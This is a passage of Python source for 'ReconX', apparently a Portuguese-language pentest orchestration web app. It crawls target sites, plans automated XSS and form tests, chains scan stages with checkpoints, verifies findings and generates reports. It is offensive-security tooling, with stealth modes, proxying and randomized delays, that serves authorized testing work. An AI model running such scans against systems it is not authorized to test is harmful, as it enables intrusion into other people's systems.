                              'Sem autenticação automática/BF; uploads e fluxos com alteração destrutiva exigem revisão',
                              'completed indica processo concluído, não ausência de vulnerabilidades']}
    for key, variable, ceiling in (('pages', 'RECONX_ADAPTIVE_PAGES', 200),
                                    ('depth', 'RECONX_ADAPTIVE_DEPTH', 5),
                                    ('jobs', 'RECONX_ADAPTIVE_JOBS', 100)):
        try:
            report['limits'][key] = max(1, min(ceiling, int(os.environ.get(variable, report['limits'][key]))))
        except ValueError:
            pass
    results = {}
    def log(message):
        socketio.emit('tool_output', {'scan_id': scan_id, 'tool': 'adaptive_web', 'line': message}, room=sid)
    if not initial or not check_binary('curl'):
        report['errors'].append({'reason': 'Alvo HTTP inválido ou curl não instalado'})
        scan['adaptive_report'] = report
        log('[Adaptive] Descoberta não executada: alvo HTTP inválido ou curl ausente')
        return {'analysis': {'raw': json.dumps(report, ensure_ascii=False), 'targets': []}}, []
    with tempfile.TemporaryDirectory(prefix='reconx-web-') as temp:
        temp = Path(temp)
        cookie_file = temp / 'cookies.txt'
        def fetch(url):
            if scan.get('cancelled'):
                raise RuntimeError('Scan cancelado')
            if not scoped_url(initial, url):
                raise ValueError('URL fora do escopo')
            proxy = dict(active_proxy)
            cmd = ['curl', '--silent', '--show-error', '--max-time', '12',
                   '--max-filesize', '524288', '--dump-header', str(temp / 'headers'),
                   '--output', str(temp / 'body'), '--cookie', str(cookie_file),
                   '--cookie-jar', str(cookie_file), url]
            cmd = inject_proxy(cmd, 'adaptive_web', proxy)
            response = subprocess.run(cmd, capture_output=True, text=True, timeout=15,
                                      env=proxy_env('adaptive_web', proxy))
            if response.returncode:
                raise RuntimeError(f'Falha curl ({response.returncode}) ao buscar página')
            blocks = re.split(r'\r?\n\r?\n', (temp / 'headers').read_text(errors='replace').strip())
            headers = next((b for b in reversed(blocks) if b.startswith('HTTP/')), '')
            lines = headers.splitlines()
            if not lines:
                raise RuntimeError('Resposta sem cabeçalho HTTP')
            metadata = dict((k.strip().lower(), v.strip()) for line in lines[1:] if ':' in line
                            for k, v in [line.split(':', 1)])
            return {'status': int(lines[0].split()[1]), 'location': metadata.get('location', ''),
                    'content_type': metadata.get('content-type', ''),
                    'body': (temp / 'body').read_text(encoding='utf-8', errors='replace')}
        def cookie_header(url):
            jar = http.cookiejar.MozillaCookieJar(str(cookie_file))
            if cookie_file.exists():
                jar.load(ignore_discard=True)
            req = urllib.request.Request(url)
            jar.add_cookie_header(req)
            return req.get_header('Cookie', '')
        pages, report['errors'], report['truncated'] = discover(initial, fetch, targets,
                                                               max_pages=report['limits']['pages'],
                                                               max_depth=report['limits']['depth'],
                                                               cancelled=lambda: scan.get('cancelled', False))
        jobs, report['pending'] = plan_tests(initial, pages, max_jobs=report['limits']['jobs'])
        report['pages'] = [p.url for p in pages]
        report['forms'] = [{'page': f['page'], 'action': f['action'], 'method': f['method'],
                            'login': f['login'], 'fields': [v['name'] for v in f['fields']]}
                           for p in pages for f in p.forms]
        log(f"[Adaptive] {len(pages)} páginas, {len(report['forms'])} formulários; {len(jobs)} testes selecionados")
        if report['truncated']:
            log('[Adaptive] Há URLs na fila não analisadas: limite de páginas ou cancelamento atingido')
        report['tasks'] = [{'tool': j['tool'], 'url': j['url'], 'reason': j['reason'], 'status': 'pending'} for j in jobs]
        for index, job in enumerate(jobs):
            if scan.get('cancelled'):
                for pending_task in report['tasks'][index:]:
                    pending_task.update(status='cancelled', reason='Scan cancelado')
                break
            task = report['tasks'][index]
            context = {'cookie': cookie_header(job['url'])}
            url = job['url']
            if job['form']:
                try:
                    # Refresh hidden/CSRF values before submitting this form.
                    response = fetch(job['form']['page'])
                    if response['status'] != 200:
                        raise RuntimeError('Página do formulário não acessível ao atualizar tokens')
                    fresh = parse_page(job['form']['page'], response['body'])
                    match = next((f for f in fresh.forms if f['action'] == job['form']['action']
                                  and f['method'] == job['form']['method']
                                  and [x['name'] for x in f['fields']] == [x['name'] for x in job['form']['fields']]), None)
                    if not match:
                        raise RuntimeError('Formulário mudou ou não está mais disponível')
                    context.update(form_request(match))
                    url = context['url']
                    context['cookie'] = cookie_header(url)
                    if context['tokens'] and job['tool'] == 'dalfox_url':
                        task.update(status='skipped', reason='XSS com token dinâmico exige renovação por requisição; revisão manual')
                        log(f"[Adaptive] Pulado: {task['reason']} — {job['url']}")
                        continue
                except (ValueError, OSError, RuntimeError) as exc:
                    task.update(status='skipped', reason=str(exc))
                    log(f"[Adaptive] Pulado: {task['reason']} — {job['url']}")
                    continue
            log(f"[Adaptive] {job['reason']}: {job['tool']} → {job['url']}")
            raw, extracted = run_tool_sequential(scan_id, job['tool'], url, sid, context, task)
            results[f"{job['tool']}::{index + 1}"] = {'raw': raw, 'targets': extracted}
            log(f"[Adaptive] {task['status']}: {job['tool']} — {task.get('reason', job['reason'])}")
        for error in report['errors']:
            log(f"[Adaptive] Não analisado: {error['reason']} — {error.get('url', initial)}")
        for pending in report['pending']:
            log(f"[Adaptive] Pendente: {pending['reason']} — {pending['url']}")
    scan['adaptive_report'] = report
    _scan_output_dir(scan_id).joinpath('adaptive_report.json').write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding='utf-8')
    results['analysis'] = {'raw': json.dumps(report, ensure_ascii=False), 'targets': []}
    return results, []

def run_stage(scan_id, stage, target_list, sid, intensity='full'):
    all_extracted = []
    stage_results = {}
    all_followups = []

    # Filtragem por perfil de intensidade
    all_stage_tools = stage['tools']
    if intensity == 'quick':
        filtered = [t for t in all_stage_tools if 'fast' in TOOLS.get(t, {}).get('tags', [])]
        tools_to_run = filtered if filtered else all_stage_tools
    elif intensity == 'stealth':
        filtered = [t for t in all_stage_tools if 'passive' in TOOLS.get(t, {}).get('tags', [])]
        tools_to_run = filtered if filtered else all_stage_tools
    else:
        tools_to_run = all_stage_tools

    socketio.emit('stage_start', {
        'scan_id':scan_id, 'stage_id':stage['id'],
        'stage_name':stage['name'], 'tools':tools_to_run,
        'targets':target_list[:5],
        'intensity': intensity,
    }, room=sid)

    for tool_key in tools_to_run:
        if active_scans.get(scan_id, {}).get('cancelled'):
            break
        if tool_key == 'adaptive_web':
            adaptive_results, _ = run_adaptive_web(scan_id, target_list, sid)
            stage_results.update(adaptive_results)
            continue
        
        wait_time = random.uniform(1.5, 4.2)
        time.sleep(wait_time)

        for raw_target in target_list:
            raw, extracted = run_tool_sequential(scan_id, tool_key, raw_target, sid)
            key = f"{tool_key}::{raw_target[:80]}"
            stage_results[key] = {'raw': raw, 'targets': extracted}
            all_extracted.extend(extracted)
            tool = TOOLS.get(tool_key, {})
            all_followups.extend(tool.get('manual_followup', []))

    seen = set(); unique = []
    for t in all_extracted:
        if t['value'] not in seen:
            seen.add(t['value']); unique.append(t)

    socketio.emit('stage_done', {
        'scan_id':scan_id, 'stage_id':stage['id'],
        'stage_name':stage['name'],
        'extracted_count':len(unique),
        'extracted_targets':unique,
        'manual_followups': list(set(all_followups)),
    }, room=sid)

    return stage_results, unique

def run_pipeline(scan_id, pipeline_def, initial_target, custom_stages, sid, intensity='full'):
    stages = list(custom_stages if custom_stages else pipeline_def.get('stages', []))
    if (intensity == 'full' and pipeline_def.get('label') in
            ('CTF / HTB Box', 'Web App Pentest', 'Full Pentest', 'Bug Bounty', 'API Pentest')
            and not any('adaptive_web' in s.get('tools', []) for s in stages)):
        index = next((i for i, s in enumerate(stages) if s.get('phase') == 'test'), len(stages))
        stages.insert(index, {'id': 'adaptive', 'name': 'Adaptive Web: formulários e parâmetros',
                              'phase': 'test', 'tools': ['adaptive_web']})
    all_results = {}
    current_targets = [initial_target]
    all_followups = []

    for i, stage in enumerate(stages):
        if active_scans.get(scan_id, {}).get('cancelled'):
            break

        stage_results, extracted = run_stage(scan_id, stage, current_targets, sid, intensity)
        all_results[stage['id']] = stage_results

        # Coleta followups
        for tool_key in stage['tools']:
            all_followups.extend(TOOLS.get(tool_key, {}).get('manual_followup', []))

        if i < len(stages) - 1:
            # Só pivota em alvos acionáveis (host/url/path). Findings nunca viram alvo.
            pivots = [t for t in extracted if t.get('type') in ('host', 'url', 'path')]
            if pivots:
                # Auto-aprovação: poucos pivôs e nenhum finding crítico/alto ainda
                summ = db_summary(scan_id)
                sev  = summ.get('severity', {})
                has_critical = (sev.get('critical', 0) + sev.get('high', 0)) > 0
                auto_approve = (len(pivots) <= AUTO_CHECKPOINT_THRESHOLD and not has_critical)

                if auto_approve:
                    socketio.emit('checkpoint_auto', {
                        'scan_id': scan_id,
                        'after_stage': stage['id'],
                        'after_stage_name': stage['name'],
                        'next_stage': stages[i+1]['name'],
                        'approved_count': len(pivots),
                        'reason': f'{len(pivots)} pivôs, sem critical/high — continuando automaticamente',
                    }, room=sid)
                    current_targets = [p['value'] for p in pivots]
                    continue

                # Checkpoint manual: muitos pivôs ou findings críticos encontrados
                active_scans[scan_id].update({
                    'status': 'checkpoint',
                    'pending_targets': pivots,
                    'remaining_stages': stages[i+1:],
                    'all_results': all_results,
                    'all_followups': all_followups,
                })
                socketio.emit('checkpoint', {
                    'scan_id': scan_id,
                    'after_stage': stage['id'],
                    'after_stage_name': stage['name'],
                    'next_stage': stages[i+1]['name'],
                    'targets': pivots,
                    'total': len(pivots),
                    'manual_followups': list(set(all_followups)),
                    'critical_high_count': sev.get('critical', 0) + sev.get('high', 0),
                }, room=sid)
                return
            # Sem novos pivôs: segue para o próximo estágio no(s) mesmo(s) alvo(s).

    _finish(scan_id, all_results, initial_target, all_followups, sid)

def _finish(scan_id, all_results, target, followups, sid):
    result_file = RESULTS_DIR / f"{scan_id}.json"
    with open(result_file, 'w') as f:
        json.dump({
            'scan_id': scan_id, 'target': target,
            'proxy_used': active_proxy.get('profile', 'none'),
            'results': {k: {t: v['raw'] for t, v in stage.items()}
                        for k, stage in all_results.items()},
            'manual_followups': list(set(followups)),
            'manual_checklist': MANUAL_CHECKLIST,
            'adaptive_report': active_scans.get(scan_id, {}).get('adaptive_report'),
            'timestamp': datetime.now().isoformat(),
        }, f, indent=2)

    socketio.emit('pipeline_complete', {
        'scan_id': scan_id,
        'result_file': str(result_file),
        'manual_checklist': MANUAL_CHECKLIST,
        'manual_followups': list(set(followups)),
    }, room=sid)

    db_finish_scan(scan_id, 'done')
    if scan_id in active_scans:
        active_scans[scan_id]['status'] = 'done'

    # Webhook de notificação (Slack/Discord/custom)
    if WEBHOOK_URL:
        try:
            import urllib.request
            summ = db_summary(scan_id)
            sev  = summ.get('severity', {})
            msg  = (f"*ReconX* — Scan concluido\n"
                    f"Alvo: `{target}` | ID: `{scan_id}`\n"
                    f"Findings: critical={sev.get('critical',0)} high={sev.get('high',0)} "
                    f"medium={sev.get('medium',0)} low={sev.get('low',0)}")
            payload = json.dumps({"text": msg}).encode()
            req = urllib.request.Request(WEBHOOK_URL, data=payload,
                                         headers={"Content-Type": "application/json"})
            urllib.request.urlopen(req, timeout=5)
        except Exception as e:
            socketio.emit('tool_output', {'scan_id': scan_id, 'tool': 'webhook',
                                          'line': f'[webhook] erro: {e}'}, room=sid)

# ══════════════════════════════════════════════════════════════════════════════
# ROTAS
# ══════════════════════════════════════════════════════════════════════════════

def _safe_js_json(obj):
    """JSON seguro para embedding em <script> — escapa </ para evitar fechar a tag prematuramente."""
    raw = json.dumps(obj, ensure_ascii=False)
    # </script> dentro de JSON fecha o <script> no HTML; </ -> <\/ é JSON válido e seguro
    raw = raw.replace('</', '<\/')
    return raw

@app.route('/')
def index():
    tools_s = {k: {**t, 'available': check_binary(t['binary'])} for k, t in TOOLS.items()}
    return render_template('index.html',
        tools_json=_safe_js_json(tools_s),
        pipelines_json=_safe_js_json(PIPELINES),
        proxy_profiles_json=_safe_js_json(PROXY_PROFILES),
        manual_checklist_json=_safe_js_json(MANUAL_CHECKLIST),
    )

@app.route('/api/proxy/status')
def api_proxy_status():
    return jsonify(proxy_status())

@app.route('/api/results')
def api_results():
    results = []
    for f in sorted(RESULTS_DIR.glob('*.json'), reverse=True)[:30]:
        try:
            d = json.loads(f.read_text())
            results.append({'scan_id':d['scan_id'],'target':d['target'],
                'proxy':d.get('proxy_used','none'),'timestamp':d['timestamp']})
        except: pass
    return jsonify(results)

@app.route('/api/results/<scan_id>')
def api_result(scan_id):
    f = RESULTS_DIR / f"{scan_id}.json"
    if not f.exists(): return jsonify({'error':'Not found'}), 404
    return jsonify(json.loads(f.read_text()))

@app.route('/api/retest/<scan_id>/<int:finding_id>')
def api_retest(scan_id, finding_id):
    """Re-executa a tool responsável por um finding contra o alvo original."""
    with _db_lock, _db() as c:
        row = c.execute(
            'SELECT tool,ftype,target FROM findings WHERE scan_id=? AND id=?',
            (scan_id, finding_id)).fetchone()
    if not row:
        return jsonify({'error': 'Finding nao encontrado'}), 404
    tool_key, ftype, target = row['tool'], row['ftype'], row['target']
    if tool_key not in TOOLS:
        return jsonify({'error': f'Tool desconhecida: {tool_key}'}), 400
    t = TOOLS[tool_key]
    try:
        proxy = dict(active_proxy)
        cmd, reason = build_cmd(tool_key, target, proxy)
        if cmd is None:
            return jsonify({'error': reason}), 400
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120,
                                env=proxy_env(tool_key, proxy))
        return jsonify({
            'scan_id': scan_id, 'finding_id': finding_id,
            'tool': tool_key, 'target': target,
            'stdout': result.stdout[:4000],
            'returncode': result.returncode,
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/verify/<scan_id>/<int:finding_id>', methods=['POST'])
def api_verify(scan_id, finding_id):
    """Verifica ativamente um finding. So roda por acao explicita do usuario."""
    # Regra de seguranca: nao verificar scans em modo stealth (verificacao faz ruido)
    pipeline = db_scan_pipeline(scan_id)
    if pipeline and 'stealth' in pipeline.lower():
        return jsonify({'ok': False,
                        'error': 'Verificacao ativa desabilitada em scans stealth'}), 403

    with _db_lock, _db() as c:
        row = c.execute(
            'SELECT id,tool,ftype,name,severity,target,evidence,confidence '
            'FROM findings WHERE scan_id=? AND id=?',
            (scan_id, finding_id)).fetchone()
    if not row:
        return jsonify({'ok': False, 'error': 'Finding nao encontrado'}), 404

    finding = dict(row)
    res = run_verification(finding)
    res['scan_id'] = scan_id
    res['finding_id'] = finding_id

    # Sucesso confirmado -> eleva confidence e salva evidencia
    if res.get('ok') and res.get('verified'):
        cmd_str = ' '.join(res.get('cmd', []))
        new_evidence = f"[VERIFICADO via {res.get('tool')}]\n$ {cmd_str}\n\n{res.get('output','')}"
        db_update_finding(scan_id, finding_id,
                          confidence='confirmed', evidence=new_evidence)
        res['confidence'] = 'confirmed'

    status = 200 if res.get('ok') else 400
    return jsonify(res), status

@app.route('/api/action_items/<scan_id>')
def api_action_items(scan_id):
    """
    Retorna itens de ação priorizados para o pentester.
    Minimiza interação humana: pentester só precisa validar o 'immediate' e 'worth_testing'.
    """
    findings = db_findings(scan_id)
    summ     = db_summary(scan_id)
    sev      = summ.get('severity', {})

    sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4, 'unknown': 5}
    conf_order = {'confirmed': 0, 'likely': 1, 'possible': 2}

    def priority_key(f):
        return (
            sev_order.get(f.get('severity', 'unknown'), 5),
            conf_order.get(f.get('confidence', 'possible'), 2),
        )

    findings_sorted = sorted(findings, key=priority_key)

    # Tools com alto índice de falsos positivos — 'possible' de uma só não vira immediate
    HIGH_FP_TOOLS = {'nikto', 'whatweb', 'wafw00f'}
    # Conjunto de (name, target) com corroboração de outro tool
    corroborated = set()
    for f in findings:
        key = (f.get('name',''), f.get('target',''))
        if f.get('tool') not in HIGH_FP_TOOLS:
            corroborated.add(key)

    def is_credible(f):
        key = (f.get('name',''), f.get('target',''))
        if f.get('tool') in HIGH_FP_TOOLS and f.get('confidence') == 'possible':
            return key in corroborated  # só inclui se outro tool confirmou
        return True

    # Imediato: critical/high + confirmed/likely (validar agora)
    immediate = [f for f in findings_sorted
                 if f.get('severity') in ('critical', 'high')
                 and f.get('confidence') in ('confirmed', 'likely')
                 and is_credible(f)]

    # Vale testar: medium/high possible, ou low confirmed
    worth_testing = [f for f in findings_sorted
                     if f not in immediate
                     and (
                         (f.get('severity') in ('high', 'medium') and f.get('confidence') == 'possible')
                         or (f.get('severity') == 'low' and f.get('confidence') == 'confirmed')
                     )]

    # Opcional: o resto com severidade relevante (excluir info puro)
    skip_set = set(id(x) for x in immediate + worth_testing)
    optional = [f for f in findings_sorted
                if id(f) not in skip_set
                and f.get('severity') not in ('info', 'unknown')]

    # Checklist relevante baseada no que foi encontrado
    relevant_checklist = compute_relevant_checklist(findings)

    # Agrupamento por vetor de ataque
    attack_vectors = group_by_attack_vector(findings)

    # Anota verificabilidade para o frontend exibir o botao "Verificar"
    for f in findings:
        entry = match_verifier(f)
        if entry and f.get('confidence') != 'confirmed':
            f['verifiable'] = True
            f['verify_tool'] = entry['tool']
            f['verify_desc'] = entry['desc']
        else:
            f['verifiable'] = False

    # Stats rápidas
    stats = {
        'total': len(findings),
        'confirmed': sum(1 for f in findings if f.get('confidence') == 'confirmed'),
        'likely':    sum(1 for f in findings if f.get('confidence') == 'likely'),
        'possible':  sum(1 for f in findings if f.get('confidence') == 'possible'),
        'severity':  sev,
    }

    return jsonify({
        'scan_id':           scan_id,
        'stats':             stats,
        'immediate':         immediate,
        'worth_testing':     worth_testing,
        'optional':          optional,
        'relevant_checklist': relevant_checklist,
        'attack_vectors':    attack_vectors,
    })

@app.route('/api/diff/<scan_a>/<scan_b>')
def api_diff(scan_a, scan_b):
    """Compara dois scans e retorna o delta de findings."""
    fa = {f['dedup_key']: f for f in db_findings(scan_a) if f.get('dedup_key')}
    fb = {f['dedup_key']: f for f in db_findings(scan_b) if f.get('dedup_key')}
    # Adicionar dedup_key se não estiver no dict (SELECT *)
    if not fa:
        with _db_lock, _db() as c:
            rows = c.execute(
                'SELECT *,dedup_key FROM findings WHERE scan_id=?', (scan_a,)).fetchall()
            fa = {r['dedup_key']: dict(r) for r in rows}
    if not fb:
        with _db_lock, _db() as c:
            rows = c.execute(
                'SELECT *,dedup_key FROM findings WHERE scan_id=?', (scan_b,)).fetchall()
            fb = {r['dedup_key']: dict(r) for r in rows}
    new_findings      = [fb[k] for k in fb if k not in fa]
    resolved_findings = [fa[k] for k in fa if k not in fb]
    persistent        = [fb[k] for k in fb if k in fa]
    return jsonify({
        'scan_a': scan_a, 'scan_b': scan_b,
        'new':        new_findings,
        'resolved':   resolved_findings,
        'persistent': persistent,
        'stats': {
            'new': len(new_findings),
            'resolved': len(resolved_findings),
            'persistent': len(persistent),
        }
    })

@app.route('/api/findings/<scan_id>')
def api_findings(scan_id):
    return jsonify(db_findings(scan_id))

@app.route('/api/export/<scan_id>')
def api_export(scan_id):
    """Exporta findings em CSV ou JSON."""
    import csv, io
    findings = db_findings(scan_id)
    fmt = request.args.get('fmt', 'json')
    if fmt == 'csv':
        si = io.StringIO()
        fields = ['id','tool','ftype','name','severity','confidence','target','evidence','created_at']
        w = csv.DictWriter(si, fieldnames=fields, extrasaction='ignore')
        w.writeheader()
        w.writerows(findings)
        return Response(si.getvalue(), mimetype='text/csv',
            headers={'Content-Disposition': f'attachment; filename=reconx_{scan_id}.csv'})
    return Response(json.dumps(findings, indent=2, ensure_ascii=False),
        mimetype='application/json',
        headers={'Content-Disposition': f'attachment; filename=reconx_{scan_id}.json'})

@app.route('/api/scan/<scan_id>/summary')
def api_scan_summary(scan_id):
    return jsonify(db_summary(scan_id))

def build_markdown_report(d: dict, findings=None, summary=None) -> str:
    """Gera um relatório Markdown a partir do JSON salvo de um scan."""
    lines = []
    lines.append(f"# ReconX — Relatório de Recon/Pentest")
    lines.append("")
    lines.append(f"- **Alvo:** `{d.get('target','?')}`")
    lines.append(f"- **Scan ID:** `{d.get('scan_id','?')}`")
    lines.append(f"- **Proxy:** {d.get('proxy_used','none')}")
    lines.append(f"- **Data:** {d.get('timestamp','?')}")
    lines.append("")
    lines.append("> Documento gerado automaticamente. Findings de scanners podem conter "
                 "falsos positivos — valide manualmente antes de reportar.")
    lines.append("")
    if summary:
        sev = summary.get('severity', {})
        order = ['critical', 'high', 'medium', 'low', 'info', 'unknown']
        parts = [f"{k}: {sev.get(k,0)}" for k in order if sev.get(k, 0)]
        lines.append("## Resumo de findings")
        lines.append("")
        lines.append(", ".join(parts) if parts else "Nenhum finding registrado.")
        lines.append("")
    if findings:
        lines.append("## Findings (por severidade)")
        for fnd in findings:
            tgt = f"  -  {fnd['target']}" if fnd.get('target') else ""
            lines.append(f"- **[{fnd['severity'].upper()}]** {fnd['name']} - `{fnd['tool']}`{tgt}")
        lines.append("")
    lines.append("## Resultados por estágio")
    for stage_id, tools in d.get('results', {}).items():
        lines.append(f"\n### Estágio `{stage_id}`")
        for tool_key, raw in tools.items():
            tool_label = TOOLS.get(tool_key.split('::')[0], {}).get('label', tool_key)
            raw = (raw or '').strip()
            lines.append(f"\n#### {tool_label} — `{tool_key}`")
            if not raw:
                lines.append("_Sem saída._")
                continue
            snippet = raw if len(raw) < 8000 else raw[:8000] + "\n... (truncado)"
            lines.append("```\n" + snippet + "\n```")
    fups = d.get('manual_followups', [])
    if fups:
        lines.append("\n## Follow-ups manuais sugeridos")
        for f in fups:
            lines.append(f"- [ ] {f}")
    checklist = d.get('manual_checklist', {})
    if checklist:
        lines.append("\n## Checklist de testes manuais (cobertura)")
        for _, cat in checklist.items():
            lines.append(f"\n### {cat.get('icon','')} {cat.get('label','')}")
            for c in cat.get('checks', []):
                lines.append(f"- [ ] {c}")
    return "\n".join(lines) + "\n"

@app.route('/api/report/<scan_id>')
def api_report(scan_id):
    f = RESULTS_DIR / f"{scan_id}.json"
    if not f.exists():
        return jsonify({'error': 'Not found'}), 404
    data     = json.loads(f.read_text())
    findings = db_findings(scan_id)
    summary  = db_summary(scan_id)
    fmt      = request.args.get('fmt', 'html')
    if fmt == 'md':
        md = build_markdown_report(data, findings, summary)
        return Response(md, mimetype='text/markdown',
            headers={'Content-Disposition': f'attachment; filename=reconx_{scan_id}.md'})
    html = build_html_report(data, findings, summary)
    return Response(html, mimetype='text/html',
        headers={'Content-Disposition': f'attachment; filename=reconx_{scan_id}.html'})

def build_html_report(d: dict, findings=None, summary=None) -> str:
    from html import escape as esc
    from datetime import datetime
    target   = d.get('target', '?')
    scan_id  = d.get('scan_id', '?')
    ts       = d.get('timestamp', datetime.now().isoformat())
    proxy    = d.get('proxy_used', 'none')
    sev      = (summary or {}).get('severity', {})
    sev_order = ['critical','high','medium','low','info','unknown']
    sev_color  = {'critical':'#ff4d6d','high':'#ff8c42','medium':'#ffd93d',
                  'low':'#4dabf7','info':'#7a8896','unknown':'#55606e'}

    def sev_badge(s):
        c = sev_color.get(s, '#55606e')
        return f'<span style="background:{c}22;color:{c};border:1px solid {c}44;padding:1px 7px;border-radius:3px;font-size:11px;font-weight:700">{s.upper()}</span>'

    def conf_badge(c):
        icons = {'confirmed': ('\U0001f534','#ff4d6d'), 'likely': ('\U0001f7e1','#ffb86c'), 'possible': ('⬛','#6272a4')}
        ico, col = icons.get(c, ('⬛','#6272a4'))
        return f'<span style="font-size:10px;color:{col}">{ico} {c}</span>'

    vectors   = group_by_attack_vector(findings or [])
    rel_cl    = compute_relevant_checklist(findings or [])
    total_f   = len(findings or [])
    confirmed_f = sum(1 for f in (findings or []) if f.get('confidence') == 'confirmed')

    rows_by_sev = ''
    for s in sev_order:
        fl = [f for f in (findings or []) if f.get('severity') == s]
        for f in fl:
            ev = esc(f.get('evidence','') or '')
            ev_cell = (f'<details><summary style="cursor:pointer;color:#6272a4;font-size:10px">ver evidencia</summary>'
                       f'<pre style="margin:5px 0 0;font-size:10px;color:#cdd6f4;white-space:pre-wrap;max-height:120px;overflow-y:auto">{ev[:800]}</pre></details>') if ev else ''
            rows_by_sev += (
                f'<tr><td style="padding:8px 10px">{sev_badge(s)}</td>'
                f'<td style="padding:8px 10px;color:#cdd6f4">{esc(f.get("name",""))}<br>'
                f'<span style="font-size:10px;color:#6272a4">{esc(f.get("tool",""))} - {esc(f.get("ftype",""))}</span>'
                f'{ev_cell}</td>'
                f'<td style="padding:8px 10px">{conf_badge(f.get("confidence","possible"))}</td>'
                f'<td style="padding:8px 10px;font-size:10px;color:#6272a4">{esc(f.get("target",""))}</td></tr>'
            )

    vector_sections = ''
    for vec, fl in vectors.items():
        cnt = len(fl)
        items_html = ''
        for fv in fl[:10]:
            col = sev_color.get(fv.get('severity','unknown'), '#55606e')
            items_html += (f'<div style="margin-top:5px;font-size:10px;padding-left:10px;border-left:2px solid {col}">'
                           f'{esc(fv.get("name",""))} &nbsp; {conf_badge(fv.get("confidence","possible"))}</div>')
        if len(fl) > 10:
            items_html += f'<div style="font-size:10px;color:#4e5a7a;padding-left:10px;margin-top:4px">... e mais {len(fl)-10}</div>'
        vector_sections += (f'<div style="margin-bottom:12px;padding:10px 14px;background:#0e1118;border:1px solid #1e2535;border-radius:6px">'
                            f'<b style="color:#00d4ff">{vec}</b> <span style="color:#4e5a7a;font-size:10px">({cnt})</span>'
                            f'{items_html}</div>')

    cl_items = ''
    for k in rel_cl:
        cat = MANUAL_CHECKLIST.get(k, {})
        if not cat:
            continue
        checks_html = ''.join(f'<li style="margin:3px 0;color:#cdd6f4;font-size:11px">&#9744; {esc(c)}</li>' for c in cat.get('checks', []))
        cl_items += (f'<div style="margin-bottom:10px">'
                     f'<b style="color:#bd93f9;font-size:11px">{esc(cat.get("icon",""))} {esc(cat.get("label",""))}</b>'
                     f'<ul style="margin:6px 0 0 18px;padding:0">{checks_html}</ul></div>')

    sev_summary = ' &nbsp; '.join(
        '<span style="color:{}">{}: <b>{}</b></span>'.format(sev_color.get(s,'#55606e'), s, sev.get(s,0))
        for s in sev_order if sev.get(s, 0)
    )
    tbl = ('<table><thead><tr><th>Severidade</th><th>Finding</th><th>Confidence</th><th>Alvo</th></tr></thead>'
           f'<tbody>{rows_by_sev}</tbody></table>') if rows_by_sev else '<p style="color:#4e5a7a">Nenhum finding registrado.</p>'

    return f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>ReconX - {esc(target)} - {esc(scan_id)}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{background:#080a0f;color:#cdd6f4;font-family:'JetBrains Mono',monospace;font-size:12px;padding:30px}}
h1{{font-family:sans-serif;font-size:22px;font-weight:800;color:#00ff88;margin-bottom:4px}}
h2{{font-family:sans-serif;font-size:14px;font-weight:700;color:#cdd6f4;margin:28px 0 12px;border-bottom:1px solid #1e2535;padding-bottom:6px}}
table{{width:100%;border-collapse:collapse;margin-bottom:10px}}
th{{text-align:left;padding:7px 10px;font-size:9px;text-transform:uppercase;letter-spacing:1.5px;color:#4e5a7a;background:#0e1118;border-bottom:1px solid #1e2535}}
td{{border-bottom:1px solid #141820;vertical-align:top}}
tr:hover td{{background:#0e1118}}
@media print{{body{{background:#fff;color:#000}}h1{{color:#006600}}}}
</style>
</head>
<body>
<h1>&#11041; ReconX - Relatorio de Pentest</h1>
<div style="color:#6272a4;font-size:11px;margin-bottom:20px">
  Alvo: <span style="color:#00ff88">{esc(target)}</span> &nbsp;|&nbsp;
  Scan: <code style="color:#00d4ff">{esc(scan_id)}</code> &nbsp;|&nbsp;
  Data: {esc(ts[:19].replace('T',' '))} &nbsp;|&nbsp; Proxy: {esc(proxy)}
</div>
<div style="background:#0e1118;border:1px solid #1e2535;border-radius:7px;padding:14px;margin-bottom:20px">
  <div style="font-size:11px;margin-bottom:6px;color:#6272a4">SUMARIO</div>
  <div style="font-size:13px">{sev_summary or 'Nenhum finding'}</div>
  <div style="margin-top:8px;font-size:10px;color:#6272a4">
    Total: {total_f} findings &nbsp; Confirmados: <span style="color:#ff4d6d">{confirmed_f}</span>
  </div>
  <p style="margin-top:10px;font-size:10px;color:#6272a4;border-top:1px solid #1e2535;padding-top:8px">
    &#9888; Documento gerado automaticamente. Valide antes de reportar ao cliente.
  </p>
</div>
<h2>Findings por severidade</h2>
{tbl}
<h2>Agrupamento por vetor de ataque</h2>
{vector_sections or '<p style="color:#4e5a7a">Nenhum dado.</p>'}
<h2>Checklist de testes manuais relevantes</h2>
{cl_items or '<p style="color:#4e5a7a">Nenhuma categoria relevante identificada.</p>'}
</body></html>"""

# ══════════════════════════════════════════════════════════════════════════════
# SOCKET EVENTS
# ══════════════════════════════════════════════════════════════════════════════

@socketio.on('connect')
def on_connect():
    emit('connected', {'sid': request.sid, 'proxy': proxy_status()})

@socketio.on('set_proxy')
def on_set_proxy(data):
    global active_proxy
    profile = data.get('profile', 'none')
    custom_http  = data.get('custom_http')
    custom_socks = data.get('custom_socks')

    if profile not in PROXY_PROFILES:
        emit('proxy_error', {'message': f'Perfil desconhecido: {profile}'}); return

    p = PROXY_PROFILES[profile]
    active_proxy = {'profile': profile,
                    'http': custom_http if profile == 'custom' else p.get('http'),
                    'socks': custom_socks if profile == 'custom' else p.get('socks')}

    status = proxy_status()
    emit('proxy_set', status)

    if status['active'] and not status['reachable']:
        emit('proxy_warning', {
            'message': f"Proxy configurado mas não acessível. {p.get('setup_tip','')}",
            'profile': profile,
        })

@socketio.on('start_pipeline')
def on_start(data):
    target = data.get('target', '').strip()
    pipeline_key  = data.get('pipeline_key')
    custom_stages = data.get('custom_stages')
    sid = request.sid

    if not target:
        emit('error', {'message': 'Alvo obrigatório'}); return

    scan_id = str(uuid.uuid4())[:8]
    pipeline_def = PIPELINES.get(pipeline_key, {})
    active_scans[scan_id] = {
        'processes': {}, 'cancelled': False,
        'status': 'running', 'target': target, 'sid': sid, 'intensity': data.get('intensity', 'full'),
    }
    db_create_scan(scan_id, target, pipeline_def.get('label', 'Custom'),
                   proxy_status().get('profile', 'none'))

    emit('pipeline_started', {
        'scan_id': scan_id, 'target': target,
        'pipeline': pipeline_def.get('label', 'Custom'),
